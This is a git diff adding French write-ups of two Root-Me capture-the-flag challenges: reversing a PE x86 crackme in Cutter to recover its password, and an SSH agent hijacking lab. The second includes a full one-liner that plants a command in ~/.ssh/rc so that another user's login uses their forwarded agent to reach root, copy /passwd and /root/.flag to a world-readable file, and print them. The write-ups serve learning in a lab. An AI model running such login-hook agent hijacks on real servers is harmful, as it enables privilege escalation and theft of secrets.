@@ -87,3 +87,84 @@ Cette requête s'avère être la bonne car nous avons pour retour à ce moment
 Le mot de passe __admin__ est non lisible, il ne nous reste qu'à inspecter l'élément et changer le __type=__ du champ password ce qui nous revèle le mot de passe de l'admin.
 
 Le flag est donc : __t0[...]k!$__
+</br>
+</br>
+
+### Chall 3 : [PE x86 - 0 protection](https://www.root-me.org/fr/Challenges/Cracking/PE-x86-0-protection)
+----
+</br>
+
+![alt text](imgchall3/chall3.png "PE x86 - 0 protection")
+</br>
+
+Dans un premier temps on télécharge le __.exe__ du challenge, ensuite nous l'ouvrons avec __Cutter__ afin d'avoir une vue désassemblée de cet exécutable.
+</br>
+
+![alt text](imgchall3/cutter_1.png "PE x86 - 0 protection")
+</br>
+
+Nous savons que le but de ce challenge est de retrouver le __Password__ donc nous allons commencer par chercher une fonction __Wrong.password__. Nous entrons notre recherche dans la barre de rechercher de __Cutter__ ce qui nous renvoie ici:
+</br>
+
+![alt text](imgchall3/cutter_2.png "PE x86 - 0 protection")
+</br>
+
+Ici on peut voir dans le __DATA XREF__ a quelle fonction correspond cette string et où elle se trouve
+> ; DATA XREF from fcn.00401726 @ 0x04017aa
+
+A partir de la nous nous deplacons vers la __fonction__ d'addresse 0x004017aa, ce qui nous ramène sur cette vue:
+</br>
+
+![alt text](imgchall3/cutter_3.png "PE x86 - 0 protection")
+</br>
+
+D'ici nous pouvons voir grâce à l'arborescence que plusieurs variables sont reliées à cette fonction, et que en bout de ligne ce trouve un commentaire en chiffre. Ces chiffres doivent être le mot de passe décomposé. Si nous executons le programme et entrons ses chiffres comme mot de passe nous avons une erreur
+> Wrong Password
+
+Si ces chiffres ne fonctionne pas essayons de les transcoder dans un autre type, par exemple en __ASCII__, si nous prennons la correspondance de chaque chiffre alors cela nous donne 
+> 'S' 'P' [...] 'S'
+
+et si nous entrons ces lettres (majuscule et miniscule respectées) alors a ce moment nous avons le message 
+> Gratz Man :)
+
+qui apparait, donc ce mot de passe est le bon
+
+Flag : __SP[...]S__
+</br>
+</br>
+
+### Chall 4 : [PE x86 - 0 protection](https://www.root-me.org/fr/Challenges/Cracking/PE-x86-0-protection)
+----
+</br>
+
+![alt text](imgchall4/chall4.png "SSH - Agent Hijacking")
+</br>
+
+Pour ce challenge nous devons demarrer un machine virtuel détenue par root-me et nous connecter desssus avec les logs: __admin/admin__.
+</br>
+
+![alt text](imgchall4/chall4_1.png "SSH - Agent Hijacking")
+</br>
+
+Donc nous avons le VM ctf06, ce qui est important a retenir pour la suite.
+
+Pour la suite nous devons ecrire un script qui nous permettra de d'exécuter du code quand notre collègue se connectera sur le server. Soit nous nous connecton sur le server et nous ecrivons notre script dans 
+> ~/.ssh/rc
+
+pour qu'il s'exécute a la connexion, soit nous ecrivons cette ligne dans notre terminal
+> ssh -oStrictHostKeyChecking=no admin@ctf06.root-me.org "echo \"ssh -oStrictHostKeyChecking=no root@localhost 'cat /passwd /root/.flag > /tmp/flag && chmod 777 /tmp/flag'\" > .ssh/rc; while [[ ! -f /tmp/flag ]]; do sleep 1; done; cat /tmp/flag"
+
+en oubliant pas de changer 
+> admin@ctf06.root-me.org
+
+en fonction de la machine que nous utilison. Ce qui nous donnera après 1 minute d'atttente ce résultat:
+</br>
+
+![alt text](imgchall4/chall4_2.png "SSH - Agent Hijacking")
+</br>
+
+Nous avons donc nos 2 flags.
+
+Flag VM : __4179[...]c300d05__
+
+Flag Chall : __B3[...]AGENT__
